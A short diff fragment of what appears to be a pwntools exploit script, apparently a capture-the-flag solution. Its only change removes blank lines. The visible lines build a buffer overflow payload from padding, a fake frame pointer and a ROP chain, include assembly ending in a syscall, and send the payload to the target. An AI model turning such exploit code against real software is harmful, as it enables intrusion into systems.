@@ -27,7 +27,6 @@ main = 0x400080
 	ret
 '''
 
-
 p = 'a' * 0x30
 p += 'RBBBBBBP'
 p += flat(
@@ -53,7 +52,6 @@ print hex( len( p ) )
     pop rax
     syscall
 '''
-
 
 y.sendafter( '?' , p )
 y.recvuntil('a' * 24)
